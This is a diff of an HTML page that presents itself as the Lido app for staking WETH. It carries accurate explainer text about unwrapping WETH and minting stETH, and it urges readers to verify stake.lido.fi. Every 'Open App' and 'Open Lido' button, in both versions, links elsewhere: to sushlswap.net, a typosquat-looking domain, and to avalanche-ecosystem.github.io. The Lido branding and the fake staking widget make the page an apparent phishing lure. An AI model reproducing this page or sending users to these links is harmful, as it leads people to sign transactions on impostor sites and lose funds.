@@ -1,48 +1,229 @@
-<!doctype html><html lang="en"><head>
+<!doctype html>
+<html lang="en">
+<head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Staking WETH — Open Lido App</title>
-<meta name="description" content="staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.">
+<title>Staking WETH - Open Lido App</title><meta name="description" content="staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.">
 <meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://staking-weth.github.io/">
-<meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Staking WETH — Open Lido App"><meta property="og:description" content="staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.">
+<link rel="canonical" href="https://staking-weth.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="Staking WETH - Open Lido App"><meta property="og:description" content="staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.">
 <meta property="og:url" content="https://staking-weth.github.io/"><meta property="og:image" content="https://staking-weth.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Staking WETH — Open Lido App"><meta name="twitter:description" content="staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app."><meta name="twitter:image" content="https://staking-weth.github.io/og-cover.png">
-<link rel="icon" href="favicon.svg" type="image/svg+xml"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Staking WETH - Open Lido App"><meta name="twitter:description" content="staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app."><meta name="twitter:image" content="https://staking-weth.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
 <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
 <link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://staking-weth.github.io/#website", "url": "https://staking-weth.github.io/", "name": "Staking WETH"}, {"@type": "WebPage", "@id": "https://staking-weth.github.io/#webpage", "url": "https://staking-weth.github.io/", "name": "Staking WETH — Open Lido App", "description": "staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.", "inLanguage": "en", "isPartOf": {"@id": "https://staking-weth.github.io/#website"}}, {"@type": "Organization", "@id": "https://staking-weth.github.io/#org", "name": "Lido", "url": "https://staking-weth.github.io/", "logo": "https://staking-weth.github.io/og-cover.png"}, {"@type": "WebApplication", "@id": "https://staking-weth.github.io/#app", "name": "Staking WETH", "url": "https://staking-weth.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.", "featureList": ["Stake", "Ethereum", "Non-custodial"], "isPartOf": {"@id": "https://staking-weth.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://staking-weth.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Can I stake WETH directly with Lido?", "acceptedAnswer": {"@type": "Answer", "text": "Lido's staking widget is built for ETH deposits. For WETH, unwrap to ETH first, then stake ETH in the official app to receive stETH."}}, {"@type": "Question", "name": "What does staking WETH mean in practice?", "acceptedAnswer": {"@type": "Answer", "text": "It usually means converting wrapped ether back to native ETH and then using a liquid staking protocol, because Ethereum validators stake ETH, not ERC-20 WETH."}}, {"@type": "Question", "name": "Do I need ETH for gas when using WETH?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. Ethereum gas is paid in native ETH, so keep some ETH in the wallet before unwrapping, staking, or withdrawing."}}, {"@type": "Question", "name": "Where can I verify WETH before staking?", "acceptedAnswer": {"@type": "Answer", "text": "Use the Wrapped Ether guide and confirm the connected app domain before signing any transaction."}}, {"@type": "Question", "name": "What risks matter before staking WETH?", "acceptedAnswer": {"@type": "Answer", "text": "Risks include smart contract risk, validator penalties, changing rewards, liquidity-token market price risk, and user mistakes such as signing on a spoofed domain."}}]}]}</script>
-</head><body>
-<div class="topline" aria-hidden="true"></div>
-<header class="hdr">
-  <a class="brand" href="#top" aria-label="Staking WETH"><svg viewBox="0 0 32 32" aria-hidden="true"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#00A3FF"/><stop offset="1" stop-color="#00A3FF"/></linearGradient></defs><g fill="none" stroke="url(#g)" stroke-width="2.6" stroke-linecap="round"><circle cx="8" cy="16" r="3.4"/><circle cx="24" cy="16" r="3.4"/><path d="M11 15.2C15 11 17 11 21 15.2"/></g></svg><h1>Staking WETH</h1></a>
-  <span class="sp"></span>
-  <a class="btn bp" href="https://sushlswap.net/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://staking-weth.github.io/#website",
+      "url": "https://staking-weth.github.io/",
+      "name": "Lido"
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://staking-weth.github.io/#webpage",
+      "url": "https://staking-weth.github.io/",
+      "name": "Staking WETH - Open Lido App",
+      "description": "staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://staking-weth.github.io/#website"
+      }
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://staking-weth.github.io/#org",
+      "name": "Lido",
+      "url": "https://staking-weth.github.io/",
+      "logo": "https://staking-weth.github.io/og-cover.png",
+      "sameAs": [
+        "https://x.com/ethereum",
+        "https://github.com/ethereum",
+        "https://www.coingecko.com/en/coins/weth",
+        "https://defillama.com/protocol/lido"
+      ]
+    },
+    {
+      "@type": "WebApplication",
+      "@id": "https://staking-weth.github.io/#app",
+      "name": "Staking WETH",
+      "url": "https://staking-weth.github.io/",
+      "applicationCategory": "FinanceApplication",
+      "operatingSystem": "Web",
+      "browserRequirements": "Requires JavaScript",
+      "description": "staking weth begins by unwrapping to ETH, then staking through Lido for stETH via the official Ethereum liquid staking app.",
+      "featureList": [
+        "Ethereum mainnet",
+        "WETH unwraps 1:1",
+        "stETH receipt token"
+      ],
+      "isPartOf": {
+        "@id": "https://staking-weth.github.io/#website"
+      }
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://staking-weth.github.io/#faq",
+      "inLanguage": "en",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "Why do I need to unwrap WETH before staking?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Ethereum staking uses native ETH, while WETH is an ERC-20 token wrapper around ETH. Lido's normal staking flow accepts ETH and mints stETH. The Lido token documentation explains the stETH output, so unwrapping converts WETH back to ETH before it is used as the staking input and for gas where needed."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Is WETH always worth the same as ETH?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Canonical WETH on Ethereum is designed to be redeemable 1:1 for ETH through the WETH smart contract, but users still need to verify the exact token contract and network. Other wrapped variants can exist, so do not assume every token named WETH is the canonical Ethereum WETH."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What contract should I verify for WETH?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The canonical Ethereum WETH contract commonly referenced by Ethereum.org and Etherscan is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. The Etherscan WETH token page is a useful reference before comparing the token address shown in your wallet or app."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Can I receive wstETH instead of stETH?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Lido's Ethereum staking flow is centered on stETH, and wstETH is the wrapped, non-rebasing version often used in DeFi. Users can wrap stETH into wstETH where supported, but integrations should be checked against the app, contract, and token behavior before signing."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Do I need native ETH if my wallet only has WETH?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Yes. Ethereum transaction fees are paid in native ETH, not WETH; Ethereum.org's gas documentation explains how gas pays for computation on the network. If your wallet only has WETH, you may be unable to unwrap, approve, stake, or withdraw until you add a small amount of native ETH on the same network."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What are the risks of staking WETH through a router?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "A router that unwraps WETH and stakes ETH in one path can add contract, approval, routing, slippage, and domain risk. Lido's Public Risk Disclosure discusses protocol, liquidity, market, and integration risks, so a combined route is harder to inspect than separate unwrap and stake steps."
+          }
+        }
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<header class="site-header">
+  <a class="brand" href="#top" aria-label="Lido"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Lido</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App &#8599;</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-  <section class="hero"><div class="wrap"><div class="hg">
-    <div class="hc">
-      <h2 class="disp">Turn wrapped ether into liquid staked ETH</h2>
-      <div class="ul"></div>
-      <p class="lead"><strong>Staking WETH</strong> starts by unwrapping to ETH, then using Lido's official app to mint stETH while keeping a liquid Ethereum position.</p>
-      <div class="cta"><a class="btn bp" href="https://sushlswap.net/" target="_blank" rel="noopener noreferrer">Open Lido App ↗</a><a class="btn bg2" href="#how">How it works</a></div>
-      <div class="trust"><span class="chip">Ethereum mainnet</span><span class="chip">WETH unwraps 1:1</span><span class="chip">stETH receipt token</span></div>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>Staking WETH</h1>
+      <div class="bridge-widget" role="group" aria-label="Lido preview"><div class="bw-field"><span class="bw-coin"><img src="static/weth.png" alt="WETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>WETH</b> &#183; Ethereum</span></span></div><div class="bw-apy"><b>~2.5-4%</b><span>APY*</span></div><div class="bw-field"><span class="bw-coin"><img src="static/steth.png" alt="stETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>stETH</b> &#183; Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App &#8599;</a></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Lido &#8599;</a></div>
+      <p class="hero-note">Live preview - APY is indicative; check the live rate in the official Lido app.</p>
+      <div class="trust-row"><span class="trust-chip">Ethereum mainnet</span><span class="trust-chip">WETH unwraps 1:1</span><span class="trust-chip">stETH receipt token</span></div>
     </div>
-    <div class="hw"><div class="card2">
-      <div class="ch"><b>Stake</b><span class="bdg">Ethereum</span></div>
-      <div class="row"><div class="side"><small>From</small><b>1.0</b></div><span class="tok">WETH<span>Ethereum</span></span></div>
-      <div class="arr"><div role="button" tabindex="0" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M12 19l-5-5M12 19l5-5"/></svg></div></div>
-      <div class="row"><div class="side"><small>To</small><b>~1.0</b></div><span class="tok">stETH<span>Ethereum</span></span></div>
-      <a class="btn bp" href="https://sushlswap.net/" target="_blank" rel="noopener noreferrer">Open Lido App ↗</a>
-      <p class="note">Preview — open the official app to stake from your own wallet.</p>
-    </div></div>
-  </div></div></section>
-  <section class="sec alt" id="about"><div class="wrap"><h2>What is Staking WETH?</h2><div class="cap">Lido is an Ethereum liquid staking protocol: WETH holders unwrap to native ETH, stake through the official app, and receive stETH as the liquid staking token. <a href="https://ethereum.org/wrapped-eth/">Ethereum.org</a> describes WETH as an ERC-20 representation of ETH redeemable back to ETH.</div></div></section>
-  <section class="sec" id="how"><div class="wrap"><h2>How Staking WETH works</h2><ol class="steps"><li><b>Prepare WETH</b><span>Use Ethereum mainnet WETH and keep native ETH available for gas.</span></li><li><b>Unwrap first</b><span>Convert WETH back to ETH through a trusted wallet or WETH contract route, since Lido staking uses ETH as the input.</span></li><li><b>Stake in Lido</b><span>Open stake.lido.fi, connect your wallet, enter the ETH amount, and review the transaction before signing.</span></li><li><b>Receive stETH</b><span>After the stake transaction settles, stETH appears in your wallet and can be held, used in DeFi, or withdrawn through Lido&#x27;s withdrawal flow.</span></li></ol></div></section>
-  <section class="sec alt"><div class="wrap"><h2>Before you stake</h2><div class="cards"><article class="card"><h3>Built around ETH</h3><p>The clean route is WETH to ETH to stETH; that keeps the action aligned with Ethereum's native staking asset instead of assuming a direct WETH deposit path.</p></article><article class="card"><h3>Liquid staking output</h3><p>Lido mints stETH for deposited ETH, so the position remains tokenized instead of requiring you to run validator infrastructure; read the <a href="https://docs.lido.fi/">Lido docs</a> for protocol details.</p></article><article class="card"><h3>Domain-first routing</h3><p>Use stake.lido.fi for the app path, check wallet prompts carefully, and avoid lookalike domains before signing any transaction.</p></article></div></div></section>
-  <section class="sec" id="faq"><div class="wrap"><h2>Staking WETH FAQ</h2><div class="faq"><details open><summary><h3>Can I stake WETH directly with Lido?</h3></summary><div><p>Lido's staking widget is built for ETH deposits. For WETH, unwrap to ETH first, then stake ETH in the official app to receive stETH.</p></div></details><details><summary><h3>What does staking WETH mean in practice?</h3></summary><div><p>It usually means converting wrapped ether back to native ETH and then using a liquid staking protocol, because Ethereum validators stake ETH, not ERC-20 WETH.</p></div></details><details><summary><h3>Do I need ETH for gas when using WETH?</h3></summary><div><p>Yes. Ethereum gas is paid in native ETH, so keep some ETH in the wallet before unwrapping, staking, or withdrawing.</p></div></details><details><summary><h3>Where can I verify WETH before staking?</h3></summary><div><p>Use the <a href="https://ethereum.org/wrapped-eth/">Wrapped Ether guide</a> and confirm the connected app domain before signing any transaction.</p></div></details><details><summary><h3>What risks matter before staking WETH?</h3></summary><div><p>Risks include smart contract risk, validator penalties, changing rewards, liquidity-token market price risk, and user mistakes such as signing on a spoofed domain.</p></div></details></div></div></section>
+  </section>
+  <section class="section" id="about">
+    <div class="container">
+      <h2>What is Staking WETH?</h2>
+      <div class="capsule"><strong>Lido</strong> is an Ethereum liquid staking protocol described in the <a class="inline-link" href="https://docs.lido.fi/" rel="noopener noreferrer">Lido protocol documentation</a>: WETH holders unwrap to native ETH, stake through the official app, and receive stETH as the liquid staking token. The <a class="inline-link" href="https://ethereum.org/wrapped-eth/" rel="noopener noreferrer">Ethereum.org wrapped ETH overview</a> describes WETH as an ERC-20 representation of ETH redeemable back to ETH.</div>
+    </div>
+  </section>
+  <section class="section" id="facts">
+    <div class="container">
+      <h2>Staking WETH at a glance</h2>
+      <div class="facts"><div class="f"><small>Category</small><b>Wrapped ETH to liquid staking</b></div><div class="f"><small>Network</small><b>Ethereum</b></div><div class="f"><small>Token</small><b>WETH</b></div><div class="f"><small>Receive</small><b>stETH</b></div><div class="f"><small>Custody</small><b>Self-custody wallet plus Lido contracts</b></div><div class="f"><small>Input step</small><b>Unwrap WETH to ETH first</b></div></div>
+      <p class="intent-a">Before signing, compare the wallet token against the <a class="inline-link" href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" rel="noopener noreferrer">canonical WETH contract record</a> and check that the asset you expect to receive is stETH on Ethereum.</p>
+    </div>
+  </section>
+  <section class="section section-alt">
+    <div class="container">
+      <h2>Staking WETH with Lido</h2>
+      <div class="intent-a">Lido's standard Ethereum staking flow uses native ETH, not WETH as the direct staking asset; the <a class="inline-link" href="https://ethereum.org/staking/" rel="noopener noreferrer">Ethereum staking guide</a> explains why ETH is the network's staking asset. For "staking WETH," the practical route is to unwrap WETH back to ETH, keep enough native ETH for gas, then stake ETH through the official Lido app to receive stETH. Ethereum.org describes WETH as an ERC-20 representation of ETH that can be redeemed back to ETH through the WETH smart contract. Read the <a class="inline-link" href="https://ethereum.org/wrapped-eth/" rel="noopener noreferrer">wrapped ETH reference</a> and verify stake.lido.fi before signing any transaction.</div>
+    </div>
+  </section>
+  <section class="section">
+    <div class="container">
+      <h2>Can I stake WETH directly?</h2>
+      <div class="intent-a">For Lido's normal app flow, the clean answer is no: stake ETH, not WETH. WETH is useful in ERC-20 DeFi contexts because it conforms to the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 token standard</a>, but Ethereum validator staking uses native ETH. Some third-party routers may combine unwrap-and-stake actions, but that adds routing and approval risk described in <a class="inline-link" href="https://docs.lido.fi/prd/" rel="noopener noreferrer">Lido's public risk disclosure</a>. A cautious user unwraps WETH through a trusted wallet or WETH contract route, confirms the ETH balance, then uses Lido's official staking interface to mint stETH.</div>
+    </div>
+  </section>
+  <section class="section section-alt">
+    <div class="container">
+      <h2>WETH to stETH conversion</h2>
+      <div class="intent-a">WETH to stETH is a two-step concept: WETH unwraps 1:1 into ETH, then ETH can be staked with Lido to mint stETH. The first step is handled by the WETH contract or a trusted wallet interface; the second step is handled by the <a class="inline-link" href="https://docs.lido.fi/contracts/lido/" rel="noopener noreferrer">Lido staking contract documentation</a>. This distinction matters because WETH, ETH, and stETH have different token mechanics. WETH is wrapped ETH, ETH is the native gas and staking asset, and stETH is Lido's liquid staking token representing ETH staked through Lido, with mechanics covered in the <a class="inline-link" href="https://docs.lido.fi/guides/lido-tokens-integration-guide/" rel="noopener noreferrer">stETH and wstETH integration notes</a>.</div>
+    </div>
+  </section>
+  <section class="section">
+    <div class="container">
+      <h2>WETH gas fees before staking</h2>
+      <div class="intent-a">You need native ETH for gas even if most of your wallet balance is WETH. The <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">Ethereum gas documentation</a> explains that gas pays for computation on the network, so normal Ethereum transactions cannot be paid with WETH. Keep enough ETH available before unwrapping, approving, staking, or withdrawing. If your entire balance is WETH, the first problem is funding gas, not staking yield; users often see WETH in a wallet but cannot move or unwrap it until they have native ETH on the same network.</div>
+    </div>
+  </section>
+  <section class="section">
+    <div class="container">
+      <h2>How to stake Staking WETH</h2>
+      <ol class="steps"><li><b>Prepare WETH</b><span>Use Ethereum mainnet WETH and keep native ETH available for gas; contract addresses can be cross-checked against <a class="inline-link" href="https://docs.lido.fi/deployed-contracts/" rel="noopener noreferrer">Lido's mainnet contract list</a> before you interact.</span></li><li><b>Unwrap first</b><span>Convert WETH back to ETH through a trusted wallet or WETH contract route, since Lido staking uses ETH as the input.</span></li><li><b>Stake in Lido</b><span>Open stake.lido.fi, connect your wallet, enter the ETH amount, and review the transaction before signing.</span></li><li><b>Receive stETH</b><span>After the stake transaction settles, stETH appears in your wallet and can be held, used in DeFi, or withdrawn through Lido's <a class="inline-link" href="https://docs.lido.fi/contracts/withdrawal-queue-erc721/" rel="noopener noreferrer">withdrawal queue contract</a> flow.</span></li></ol>
+      <div class="cta-band"><div><p>Ready to stake?</p><p class="sub">Open the official Lido app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Lido &#8599;</a></div>
+    </div>
+  </section>
+  <section class="section">
+    <div class="container">
+      <h2>WETH vs ETH for Lido staking</h2>
+      <div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>WETH</th><th>ETH</th></tr></thead><tbody><tr><td>Token type</td><td><a class="inline-link" href="https://ethereum.org/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">ERC-20-compatible representation</a> of ETH</td><td>Native Ethereum asset</td></tr><tr><td>Gas</td><td>Cannot normally pay Ethereum gas</td><td>Pays Ethereum gas</td></tr><tr><td>Staking input</td><td>Unwrap first</td><td>Direct Lido staking input</td></tr><tr><td>Lido output</td><td>After unwrap and stake, stETH</td><td>stETH</td></tr></tbody></table></div>
+    </div>
+  </section>
+  <section class="section section-alt">
+    <div class="container">
+      <h2>Fees, custody, and staking risk</h2>
+      <div class="cards three">
+        <article class="card"><h3>Contract and approval risk</h3><p>Lido publishes <a class="inline-link" href="https://docs.lido.fi/security/audits/" rel="noopener noreferrer">protocol audit references</a>, but audits do not remove smart contract, approval, or wallet-signing risk.</p></article>
+        <article class="card"><h3>Rewards and validator risk</h3><p>Staking rewards are variable, and validator penalties or slashing can affect outcomes; review the <a class="inline-link" href="https://docs.lido.fi/prd/" rel="noopener noreferrer">Lido risk disclosure details</a> before relying on projected APY.</p></article>
+        <article class="card"><h3>Liquidity and exit timing</h3><p>stETH can be withdrawn through protocol flows or traded on markets, but exits may involve queues, spreads, or delays; data pages like <a class="inline-link" href="https://defillama.com/protocol/lido" rel="noopener noreferrer">DeFiLlama's Lido profile</a> are useful for context, not guarantees.</p></article>
+      </div>
+      <div class="note-irreversible"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/></svg><span>On-chain actions are generally irreversible once confirmed, and this page is educational only - not financial advice.</span></div>
+    </div>
+  </section>
+  <section class="section section-alt" id="faq">
+    <div class="container">
+      <h2>Staking WETH FAQ</h2>
+      <div class="faq-list">
+        <details open><summary><h3>Why do I need to unwrap WETH before staking?</h3></summary><div>Ethereum staking uses native ETH, while WETH is an ERC-20 token wrapper around ETH. Lido's normal staking flow accepts ETH and mints stETH; the <a class="inline-link" href="https://docs.lido.fi/guides/lido-tokens-integration-guide/" rel="noopener noreferrer">Lido token documentation</a> explains the stETH output. Unwrapping converts WETH back to ETH so it can be used as the staking input and for gas where needed.</div></details>
+        <details><summary><h3>Is WETH always worth the same as ETH?</h3></summary><div>Canonical WETH on Ethereum is designed to be redeemable 1:1 for ETH through the WETH contract, but users still need to verify the exact token contract and network. Other wrapped variants can exist, so do not assume every token named WETH is the canonical Ethereum WETH.</div></details>
+        <details><summary><h3>What contract should I verify for WETH?</h3></summary><div>The canonical Ethereum WETH contract commonly referenced by Ethereum.org and Etherscan is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. Before unwrapping or using WETH in a staking route, compare the token address shown in your wallet or app with the <a class="inline-link" href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" rel="noopener noreferrer">Etherscan WETH listing</a>.</div></details>
+        <details><summary><h3>Can I receive wstETH instead of stETH?</h3></summary><div>Lido's Ethereum staking flow is centered on stETH, and wstETH is the wrapped, non-rebasing version often used in DeFi. Users can wrap stETH into wstETH where supported. Some integrations may route directly to wstETH, but the user should verify the app, contract, and token behavior before signing.</div></details>
+        <details><summary><h3>Do I need native ETH if my wallet only has WETH?</h3></summary><div>Yes. Ethereum transaction fees are paid in native ETH, not WETH; the <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">gas fee technical overview</a> explains the role of gas in Ethereum transactions. If your wallet only has WETH, you may be unable to unwrap, approve, stake, or withdraw until you add a small amount of native ETH on the same network for gas.</div></details>
+        <details><summary><h3>What are the risks of staking WETH through a router?</h3></summary><div>A router that unwraps WETH and stakes ETH in one path can add contract, approval, routing, slippage, and domain risk. It may be convenient, but it is harder to inspect than separate unwrap and stake steps; the <a class="inline-link" href="https://docs.lido.fi/prd/" rel="noopener noreferrer">Public Risk Disclosure from Lido</a> gives useful context for protocol, liquidity, market, and integration risks.</div></details>
+      </div>
+    </div>
+  </section>
 </main>
-<footer class="foot"><div class="wrap"><nav class="src" aria-label="Sources"><a href="https://ethereum.org/staking/" target="_blank" rel="noopener noreferrer">Ethereum staking overview</a><a href="https://ethereum.org/wrapped-eth/" target="_blank" rel="noopener noreferrer">Wrapped Ether guide</a><a href="https://docs.lido.fi/" target="_blank" rel="noopener noreferrer">Lido docs</a></nav><p class="dis">Not the official Lido app; verify stake.lido.fi before connecting; educational only, not financial advice.</p></div></footer>
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-grid"><div class="footer-col" style="max-width:none"><h4>Sources</h4><nav aria-label="Sources"><a href="https://ethereum.org/wrapped-eth/" target="_blank" rel="noopener noreferrer">Wrapped Ether guide</a><a href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" target="_blank" rel="noopener noreferrer">WETH token on Etherscan</a><a href="https://docs.lido.fi/" target="_blank" rel="noopener noreferrer">Lido official docs</a><a href="https://docs.lido.fi/guides/lido-tokens-integration-guide/" target="_blank" rel="noopener noreferrer">Lido token integration guide</a><a href="https://etherscan.io/token/0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84" target="_blank" rel="noopener noreferrer">stETH token on Etherscan</a></nav></div></div>
+    <p class="footer-note">Not the official Lido app; verify stake.lido.fi before connecting; educational only, not financial advice.</p>
+    <p class="footer-meta"><a href="#top">Back to top &#8593;</a></p>
+  </div>
+</footer>
 <script src="static/app.js" defer></script>
-</body></html>
+</body>
+</html>
